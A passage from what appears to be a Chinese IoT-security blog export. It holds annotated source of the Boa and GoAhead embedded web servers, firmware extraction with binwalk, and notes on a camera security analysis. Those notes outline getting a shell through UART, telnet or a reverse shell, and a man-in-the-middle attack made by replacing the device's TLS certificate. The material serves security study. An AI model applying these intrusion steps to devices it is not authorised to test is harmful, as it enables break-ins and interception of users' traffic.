class="line">        pid = fork();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        pid = getpid();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 选择父/子进程</span></span><br><span class="line">    <span class="keyword">switch</span> (pid) &#123;</span><br><span class="line">    <span class="comment">// 子进程创建失败</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">        <span class="comment">/* error */</span></span><br><span class="line">        perror(<span class="string">"fork/getpid"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    <span class="comment">// fork后子进程返回0</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="comment">/* child, success */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">// 本身的父进程</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">// 将进程号写入pid file</span></span><br><span class="line">        <span class="comment">/* parent, success */</span></span><br><span class="line">        <span class="keyword">if</span> (pid_file != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            FILE *PID_FILE = fopen(pid_file, <span class="string">"w"</span>);</span><br><span class="line">            <span class="keyword">if</span> (PID_FILE != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(PID_FILE, <span class="string">"%d"</span>, pid);<span class="comment">// pid file，只有一行，记录的是相应进程的pid</span></span><br><span class="line">                fclose(PID_FILE);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                perror(<span class="string">"fopen pid file"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果创建了子进程就不用写了</span></span><br><span class="line">        <span class="keyword">if</span> (do_fork)</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 丢弃多余的权限，最小权限原则</span></span><br><span class="line">    drop_privs();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* main loop */</span></span><br><span class="line">    timestamp();<span class="comment">//记录时间、打印启动时信息</span></span><br><span class="line">    status.requests = <span class="number">0</span>;<span class="comment">// 请求数</span></span><br><span class="line">    status.errors = <span class="number">0</span>;<span class="comment">// 错误数</span></span><br><span class="line">    start_time = current_time;<span class="comment">//开始时间</span></span><br><span class="line">    loop(server_s);<span class="comment">// 开启服务器，循环监听</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="config-c：read-config-files"><a href="#config-c：read-config-files" class="headerlink" title="config.c：read_config_files"></a>config.c：read_config_files</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_config_files</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *config;</span><br><span class="line"></span><br><span class="line">    current_uid = getuid();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指定默认的配置文件</span></span><br><span class="line">    <span class="keyword">if</span> (!config_file_name) &#123;</span><br><span class="line">        config_file_name = DEFAULT_CONFIG_FILE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 访问权限控制</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifdef</span> ACCESS_CONTROL</span></span><br><span class="line">        access_init();</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span>                          <span class="comment">/* ACCESS_CONTROL */</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取配置文件</span></span><br><span class="line">    config = fopen(config_file_name, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (!config) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">"Could not open boa.conf for reading.\n"</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 解析配置</span></span><br><span class="line">    parse(config);</span><br><span class="line">    fclose(config);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置主机名</span></span><br><span class="line">    <span class="keyword">if</span> (!server_name) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">he</span>;</span></span><br><span class="line">        <span class="keyword">char</span> temp_name[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 返回本地主机的标准主机名</span></span><br><span class="line">        <span class="keyword">if</span> (gethostname(temp_name, <span class="number">100</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">            perror(<span class="string">"gethostname:"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 用域名或主机名获取IP地址（hostent结构体</span></span><br><span class="line">        he = gethostbyname(temp_name);</span><br><span class="line">        <span class="keyword">if</span> (he == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            perror(<span class="string">"gethostbyname:"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 用获取到的hostent结构体来设置</span></span><br><span class="line">        server_name = strdup(he-&gt;h_name);</span><br><span class="line">        <span class="keyword">if</span> (server_name == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            perror(<span class="string">"strdup:"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置tmp目录</span></span><br><span class="line">    tempdir = getenv(<span class="string">"TMP"</span>);</span><br><span class="line">    <span class="keyword">if</span> (tempdir == <span class="literal">NULL</span>)</span><br><span class="line">        tempdir = <span class="string">"/tmp"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// here</span></span><br><span class="line">    <span class="keyword">if</span> (single_post_limit &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Invalid value for single_post_limit: %d\n"</span>,</span><br><span class="line">                single_post_limit);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (vhost_root &amp;&amp; virtualhost) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Both VHostRoot and VirtualHost were enabled, and "</span></span><br><span class="line">                <span class="string">"they are mutually exclusive.\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (vhost_root &amp;&amp; document_root) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,</span><br><span class="line">                <span class="string">"Both VHostRoot and DocumentRoot were enabled, and "</span></span><br><span class="line">                <span class="string">"they are mutually exclusive.\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!default_vhost) &#123;</span><br><span class="line">        default_vhost = DEFAULT_VHOST;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> USE_SETRLIMIT</span></span><br><span class="line">    <span class="keyword">if</span> (cgi_rlimit_cpu &lt; <span class="number">0</span>)</span><br><span class="line">        cgi_rlimit_cpu = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cgi_rlimit_data &lt; <span class="number">0</span>)</span><br><span class="line">        cgi_rlimit_data = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cgi_nice &lt; <span class="number">0</span>)</span><br><span class="line">        cgi_nice = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (max_connections &lt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">rl</span>;</span></span><br><span class="line">        <span class="keyword">int</span> c;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* has not been set explicitly */</span></span><br><span class="line">        c = getrlimit(RLIMIT_NOFILE, &amp;rl);</span><br><span class="line">        <span class="keyword">if</span> (c &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            DIE(<span class="string">"getrlimit"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        max_connections = rl.rlim_cur;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (max_connections &gt; FD_SETSIZE - <span class="number">20</span>)</span><br><span class="line">        max_connections = FD_SETSIZE - <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ka_timeout &lt; <span class="number">0</span>) ka_timeout=<span class="number">0</span>;  <span class="comment">/* not worth a message */</span></span><br><span class="line">    <span class="comment">/* save some time */</span></span><br><span class="line">    default_timeout = (ka_timeout ? ka_timeout : REQUEST_TIMEOUT);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_POLL</span></span><br><span class="line">    default_timeout *= <span class="number">1000</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (default_type == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        DIE(<span class="string">"DefaultType *must* be set!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="select-c：loop"><a href="#select-c：loop" class="headerlink" title="select.c：loop"></a>select.c：loop</h2><h2 id="requests-c：process-requests"><a href="#requests-c：process-requests" class="headerlink" title="requests.c：process_requests"></a>requests.c：process_requests</h2><h2 id="read-c：read-header"><a href="#read-c：read-header" class="headerlink" title="read.c：read_header"></a>read.c：read_header</h2>]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>IOT安全</tag>
      </tags>
  </entry>
  <entry>
    <title>嵌入式设备web服务器-goahead</title>
    <url>/2021/03/17/iot/%E5%B5%8C%E5%85%A5%E5%BC%8F%E8%AE%BE%E5%A4%87web%E6%9C%8D%E5%8A%A1%E5%99%A8-goahead/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="version-2-1-8"><a href="#version-2-1-8" class="headerlink" title="version 2.1.8"></a>version 2.1.8</h1><h2 id="initWebs"><a href="#initWebs" class="headerlink" title="initWebs"></a>initWebs</h2><blockquote>
<p>linux/web.c</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">initWebs</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hostent</span>	*<span class="title">hp</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span>	<span class="title">intaddr</span>;</span></span><br><span class="line">	<span class="keyword">char</span>			host[<span class="number">128</span>], dir[<span class="number">128</span>], webdir[<span class="number">128</span>];</span><br><span class="line">	<span class="keyword">char</span>			*cp;</span><br><span class="line">	<span class="keyword">char_t</span>			wbuf[<span class="number">128</span>];<span class="comment">//辅助作用的缓冲区</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 初始化socket子系统</span></span><br><span class="line">	<span class="comment">// 对 socketList、socketMax、socketHighestFd赋值</span></span><br><span class="line">	socketOpen();</span><br><span class="line"></span><br><span class="line">	<span class="comment">////Initialize the User Management database</span></span><br><span class="line">	<span class="meta">#<span class="meta-keyword">ifdef</span> USER_MANAGEMENT_SUPPORT</span></span><br><span class="line">		umOpen();</span><br><span class="line">		umRestore(T(<span class="string">"umconfig.txt"</span>));</span><br><span class="line">	    <span class="built_in">printf</span>(<span class="string">"open um!\n"</span>);   <span class="comment">//for debug by xie</span></span><br><span class="line">	<span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 *	Define the local Ip address, host name, default home page and the</span></span><br><span class="line"><span class="comment">	 *	root web directory.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (gethostname(host, <span class="keyword">sizeof</span>(host)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		error(E_L, E_LOG, T(<span class="string">"Can't get hostname"</span>));</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Debug the hosts is: %s\n"</span>, host);   <span class="comment">//for debug by xie</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((hp = gethostbyname(host)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Can't get host address\n"</span>);   <span class="comment">//for debug by xie</span></span><br><span class="line">		error(E_L, E_LOG, T(<span class="string">"Can't get host address"</span>));</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>((<span class="keyword">char</span> *) &amp;intaddr, (<span class="keyword">char</span> *) hp-&gt;h_addr_list[<span class="number">0</span>],</span><br><span class="line">		(<span class="keyword">size_t</span>) hp-&gt;h_length);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">	<span class="comment">// 配置web服务器选项</span></span><br><span class="line">	<span class="built_in">sprintf</span>(webdir, <span class="string">"%s"</span>, rootWeb);    <span class="comment">//add by xie 2007-11-19</span></span><br><span class="line">	websSetDefaultDir(webdir);<span class="comment">// 设置web目录</span></span><br><span class="line">	cp = inet_ntoa(intaddr);</span><br><span class="line">	ascToUni(wbuf, cp, min(<span class="built_in">strlen</span>(cp) + <span class="number">1</span>, <span class="keyword">sizeof</span>(wbuf)));<span class="comment">// 编码转换，调用memcpy</span></span><br><span class="line">	websSetIpaddr(wbuf);<span class="comment">// 设置服务器IP，调用strcpy对websIpaddr赋值</span></span><br><span class="line">	ascToUni(wbuf, host, min(<span class="built_in">strlen</span>(host) + <span class="number">1</span>, <span class="keyword">sizeof</span>(wbuf)));<span class="comment">// 设置xxx之前，一般要先编码转换</span></span><br><span class="line">	websSetHost(wbuf);<span class="comment">// 设置主机名，调用strcpy对websHost赋值</span></span><br><span class="line">	websSetDefaultPage(T(<span class="string">"home.asp"</span>));<span class="comment">// 设置默认主页</span></span><br><span class="line">	websSetPassword(password);<span class="comment">//设置密码，调用strcpy对websPassword赋值</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 在指定端口开启web服务，若port关闭，则按顺序往下试，直到retries次</span></span><br><span class="line">	websOpenServer(port, retries);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 指定uri的处理函数，函数是按顺序调用的</span></span><br><span class="line">	<span class="comment">// First create the URL handlers. Note: handlers are called in sorted order</span></span><br><span class="line">	<span class="comment">// with the longest path handler examined first. Here we define the securityhandler, forms handler and the default web page handler.</span></span><br><span class="line">	websUrlHandlerDefine(T(<span class="string">""</span>), <span class="literal">NULL</span>, <span class="number">0</span>, websSecurityHandler,WEBS_HANDLER_FIRST);<span class="comment">// first最先调用</span></span><br><span class="line">	websUrlHandlerDefine(T(<span class="string">"/goform"</span>), <span class="literal">NULL</span>, <span class="number">0</span>, websFormHandler, <span class="number">0</span>);</span><br><span class="line">	websUrlHandlerDefine(T(<span class="string">"/cgi-bin"</span>), <span class="literal">NULL</span>, <span class="number">0</span>, websCgiHandler, <span class="number">0</span>);</span><br><span class="line">	websUrlHandlerDefine(T(<span class="string">""</span>), <span class="literal">NULL</span>, <span class="number">0</span>, websDefaultHandler,WEBS_HANDLER_LAST);<span class="comment">// last最后调用</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//Now define two test procedures. Replace these with your application</span></span><br><span class="line">	<span class="comment">//relevant ASP script procedures and form functions.</span></span><br><span class="line">	websAspDefine(T(<span class="string">"aspTest"</span>), aspTest);</span><br><span class="line">	websFormDefine(T(<span class="string">"formTest"</span>), formTest);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//Create the Form handlers for the User Management pages</span></span><br><span class="line">	<span class="comment">// /goform/xxx形式uri的函数处理，多次调用websAspDefine(T("yyy"), xxx);</span></span><br><span class="line">	<span class="comment">// 基于asp和form的两种：websAspDefine和websFormDefine、asp简单form稍复杂</span></span><br><span class="line">	<span class="comment">// 用户基于此goahead框架，可自行添加的用户界面</span></span><br><span class="line">	<span class="meta">#<span class="meta-keyword">ifdef</span> USER_MANAGEMENT_SUPPORT</span></span><br><span class="line">		formDefineUserMgmt();</span><br><span class="line">	<span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 默认路径的处理函数</span></span><br><span class="line">	websUrlHandlerDefine(T(<span class="string">"/"</span>), <span class="literal">NULL</span>, <span class="number">0</span>, websHomePageHandler, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="websSecurityHandler"><a href="#websSecurityHandler" class="headerlink" title="websSecurityHandler"></a>websSecurityHandler</h2><blockquote>
<p>security.c</p>
</blockquote>
<h2 id="websRec（结构体"><a href="#websRec（结构体" class="headerlink" title="websRec（结构体"></a>websRec（结构体</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">websRec</span> &#123;</span></span><br><span class="line">	<span class="keyword">ringq_t</span>			header;				<span class="comment">/* Header dynamic string */</span></span><br><span class="line">	<span class="keyword">time_t</span>			since;				<span class="comment">/* Parsed if-modified-since time */</span></span><br><span class="line">	<span class="keyword">sym_fd_t</span>		cgiVars;			<span class="comment">/* CGI standard variables */</span></span><br><span class="line">	<span class="keyword">sym_fd_t</span>		cgiQuery;			<span class="comment">/* CGI decoded query string */</span></span><br><span class="line">	<span class="keyword">time_t</span>			timestamp;			<span class="comment">/* Last transaction with browser */</span></span><br><span class="line">	<span class="keyword">int</span>				timeout;			<span class="comment">/* Timeout handle */</span></span><br><span class="line">	<span class="keyword">char_t</span>			ipaddr[<span class="number">32</span>];			<span class="comment">/* Connecting ipaddress */</span></span><br><span class="line">	<span class="keyword">char_t</span>			type[<span class="number">64</span>];			<span class="comment">/* Mime type */</span></span><br><span class="line">	<span class="keyword">char_t</span>			*dir;				<span class="comment">/* Directory containing the page */</span></span><br><span class="line">	<span class="keyword">char_t</span>			*path;				<span class="comment">/* Path name without query */</span></span><br><span class="line">	<span class="keyword">char_t</span>			*url;				<span class="comment">/* Full request url */</span></span><br><span class="line">	<span class="keyword">char_t</span>			*host;				<span class="comment">/* Requested host */</span></span><br><span class="line">	<span class="keyword">char_t</span>			*lpath;				<span class="comment">/* Cache local path name */</span></span><br><span class="line">	<span class="keyword">char_t</span>			*query;				<span class="comment">/* Request query */</span></span><br><span class="line">	<span class="keyword">char_t</span>			*decodedQuery;		<span class="comment">/* Decoded request query */</span></span><br><span class="line">	<span class="keyword">char_t</span>			*authType;			<span class="comment">/* Authorization type (Basic/DAA) */</span></span><br><span class="line">	<span class="keyword">char_t</span>			*password;			<span class="comment">/* Authorization password */</span></span><br><span class="line">	<span class="keyword">char_t</span>			*userName;			<span class="comment">/* Authorization username */</span></span><br><span class="line">	<span class="keyword">char_t</span>			*cookie;			<span class="comment">/* Cookie string */</span></span><br><span class="line">	<span class="keyword">char_t</span>			*userAgent;			<span class="comment">/* User agent (browser) */</span></span><br><span class="line">	<span class="keyword">char_t</span>			*protocol;			<span class="comment">/* Protocol (normally HTTP) */</span></span><br><span class="line">	<span class="keyword">char_t</span>			*protoVersion;		<span class="comment">/* Protocol version */</span></span><br><span class="line">	<span class="keyword">int</span>				sid;				<span class="comment">/* Socket id (handler) */</span></span><br><span class="line">	<span class="keyword">int</span>				listenSid;			<span class="comment">/* Listen Socket id */</span></span><br><span class="line">	<span class="keyword">int</span>				port;				<span class="comment">/* Request port number */</span></span><br><span class="line">	<span class="keyword">int</span>				state;				<span class="comment">/* Current state */</span></span><br><span class="line">	<span class="keyword">int</span>				flags;				<span class="comment">/* Current flags -- see above */</span></span><br><span class="line">	<span class="keyword">int</span>				code;				<span class="comment">/* Request result code */</span></span><br><span class="line">	<span class="keyword">int</span>				clen;				<span class="comment">/* Content length */</span></span><br><span class="line">	<span class="keyword">int</span>				wid;				<span class="comment">/* Index into webs */</span></span><br><span class="line">	<span class="keyword">char_t</span>			*cgiStdin;			<span class="comment">/* filename for CGI stdin */</span></span><br><span class="line">	<span class="keyword">int</span>				docfd;				<span class="comment">/* Document file descriptor */</span></span><br><span class="line">	<span class="keyword">int</span>				numbytes;			<span class="comment">/* Bytes to transfer to browser */</span></span><br><span class="line">	<span class="keyword">int</span>				written;			<span class="comment">/* Bytes actually transferred */</span></span><br><span class="line">	<span class="keyword">void</span>			(*writeSocket)(struct websRec *wp);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DIGEST_ACCESS_SUPPORT</span></span><br><span class="line">    <span class="keyword">char_t</span>			*realm;		<span class="comment">/* usually the same as "host" from websRec */</span></span><br><span class="line">    <span class="keyword">char_t</span>			*nonce;		<span class="comment">/* opaque-to-client string sent by server */</span></span><br><span class="line">    <span class="keyword">char_t</span>			*digest;	<span class="comment">/* digest form of user password */</span></span><br><span class="line">    <span class="keyword">char_t</span>			*uri;		<span class="comment">/* URI found in DAA header */</span></span><br><span class="line">    <span class="keyword">char_t</span>			*opaque;	<span class="comment">/* opaque value passed from server */</span></span><br><span class="line">    <span class="keyword">char_t</span>			*nc;		<span class="comment">/* nonce count */</span></span><br><span class="line">    <span class="keyword">char_t</span>			*cnonce;	<span class="comment">/* check nonce */</span></span><br><span class="line">    <span class="keyword">char_t</span>			*qop;		<span class="comment">/* quality operator */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> WEBS_SSL_SUPPORT</span></span><br><span class="line">	websSSL_t		*wsp;		<span class="comment">/* SSL data structure */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125; websRec;</span><br><span class="line"><span class="keyword">typedef</span> websRec	*<span class="keyword">webs_t</span>;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>IOT安全</tag>
      </tags>
  </entry>
  <entry>
    <title>小豚摄像头的安全分析</title>
    <url>/2021/03/15/iot/%E5%B0%8F%E8%B1%9A%E6%91%84%E5%83%8F%E5%A4%B4%E7%9A%84%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="小豚摄像头的安全分析"><a href="#小豚摄像头的安全分析" class="headerlink" title="小豚摄像头的安全分析"></a>小豚摄像头的安全分析</h1><h2 id="上"><a href="#上" class="headerlink" title="上"></a>上</h2><ul>
<li>PS：ppt见小米 aiot安全峰会，打开Iot设备分析的第一扇门.pdf</li>
<li><p>概要：通过uart获取shell，获取到shell很重要，能ps看状态、gdb调试，通过uart或telnet</p>
</li>
<li><p>外部分析</p>
<ul>
<li>抓包通信过程，前期coap协议配网，后期云端作为中转并加密通信</li>
<li>扫描端口</li>
</ul>
</li>
<li>硬件分析<ul>
<li>找cpu/soc、flash</li>
<li>依据型号找芯片手册、开发sdk，官网或淘宝</li>
<li>提取固件，flash+编程器，结合sdk进行固件分析</li>
</ul>
</li>
<li><p>串口分析，获取shell</p>
<ul>
<li>光有硬件层面上uart连接还不行，还需软件层面支持</li>
<li>支持1，kernel的引导参数：修改bootargs的console从null到ttyxxx</li>
<li>支持2，文件系统的启动脚本，可理解为那个rcS文件：将引脚从gpio功能改为uart功能</li>
</ul>
</li>
<li><p>soc（个人感性认识，不严谨）    </p>
<ul>
<li>可理解为cpu，网上：CPU = 运算器 + 控制器，现在几乎没有纯粹的CPU了，都是SoC</li>
<li>可理解为整块板子，文中：几个过孔即为SoC的UART接口</li>
<li>mcu可理解为cpu，即图中红框大芯片</li>
</ul>
</li>
<li>保护机制<ul>
<li>uboot对自身部分有保护，对其它部分并没有</li>
<li>但是其它部分有自己的，如crc校验，虽然不如前者的secure boot功能</li>
</ul>
</li>
<li>摄像头与云端TLS加密通信，摄像头对云端的TLS证书有校验，无法用简单的中间人攻击拿到通信内容</li>
</ul>
<h2 id="下"><a href="#下" class="headerlink" title="下"></a>下</h2><ul>
<li>概要：突破tls加密通信，实现中间人攻击，获取通信流量</li>
<li>配置sdk开发环境<ul>
<li>包含交叉编译环境及源码</li>
<li>编译busubox（支持telnet和tfpt）、gdbserver</li>
</ul>
</li>
<li>启用telnet<ul>
<li>若不支持，可重新编译busybox，修改config文件</li>
<li>启动脚本中挂载devpts设备文件，否则telnetd在建立第一个telnet连接后就会崩溃？（why？）</li>
<li>启动脚本中设置开机自启</li>
</ul>
</li>
<li>获取shell<ul>
<li>硬件即urat法获取shell不方便，最好telnet、反向shell等软件法</li>
<li>uart和telnet都固件重打包刷回flash，整个反向shell来作为预备，以免二者都失效而反复折腾硬件</li>
<li>本文的反向shell代码思路简单，可收藏待用（因为是新程序，故本地qemu测试后再上传）</li>
</ul>
</li>
<li>程序分析<ul>
<li>获取shell后，ps找关键进程</li>
<li>静态分析：patch程序，使其打印日志</li>
<li>动态调试：编译gdbserver</li>
<li>通信内容分析：通过中间人攻击获取未加密流量</li>
</ul>
</li>
<li>中间人攻击<ul>
<li>tld加密通信，并验证tls证书，不可中间人</li>
<li>将tls证书修改为自己的，就可进行中间人攻击，获取二者的通信内容</li>
</ul>
</li>
<li>其它<ul>
<li>Linux启动脚本不一定非是rcS，本文为big_run.sh和small_run.sh</li>
<li>打补丁脚本、中间人攻击脚本，都并未给出</li>
<li>tls是协议层面上的加密，程序中的加密是应用层面上的</li>
<li>缺少证书相关知识，为何修改tls证书就可中间人</li>
</ul>
</li>
</ul>
<blockquote>
<p>参考：</p>
<ul>
<li><a href="https://www.4hou.com/posts/XqYl" target="_blank" rel="noopener">https://www.4hou.com/posts/XqYl</a></li>
<li><a href="https://www.4hou.com/posts/22GP" target="_blank" rel="noopener">https://www.4hou.com/posts/22GP</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>摄像头</tag>
      </tags>
  </entry>
  <entry>
    <title>iot设备固件解密及分析</title>
    <url>/2021/02/12/iot/iot%E8%AE%BE%E5%A4%87%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%8F%8A%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="iot设备固件解密及分析"><a href="#iot设备固件解密及分析" class="headerlink" title="iot设备固件解密及分析"></a>iot设备固件解密及分析</h1><h1 id="提取"><a href="#提取" class="headerlink" title="提取"></a>提取</h1><h2 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文件太多，直接-e或-Me耗时太多</span></span><br><span class="line"><span class="comment"># 先不加参数看偏移，再-o指定偏移来提取</span></span><br><span class="line">$ binwalk R7800-V1.0.2.82.img</span><br><span class="line">2228352       0x220080        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 28795562 bytes, 3892 inodes, blocksize: 262144 bytes, created: 2021-02-05 11:54:07</span><br><span class="line"></span><br><span class="line">$ binwalk -o 0x220080 -e R7800-V1.0.2.82.img</span><br></pre></td></tr></table></figure>
<h1 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h1><h2 id="00"><a href="#00" class="headerlink" title="00"></a>00</h2><ul>
<li>jffs2</li>
</ul>
<p><a href="https://github.com/sviehb/jefferson" target="_blank" rel="noopener">https://github.com/sviehb/jefferson</a></p>
<ul>
<li>ubi</li>
</ul>
<p><a href="https://github.com/jrspruitt/ubi_reader" target="_blank" rel="noopener">https://github.com/jrspruitt/ubi_reader</a></p>
<h2 id="01-mercury-vxworks-unowfs"><a href="#01-mercury-vxworks-unowfs" class="headerlink" title="01-mercury-vxworks-unowfs"></a>01-mercury-vxworks-unowfs</h2><ul>
<li><a href="http://www.devttys0.com/2011/06/mystery-file-system/" target="_blank" rel="noopener">http://www.devttys0.com/2011/06/mystery-file-system/</a></li>
<li><a href="http://www.devttys0.com/wp-content/uploads/2011/06/unowfs.c" target="_blank" rel="noopener">http://www.devttys0.com/wp-content/uploads/2011/06/unowfs.c</a></li>
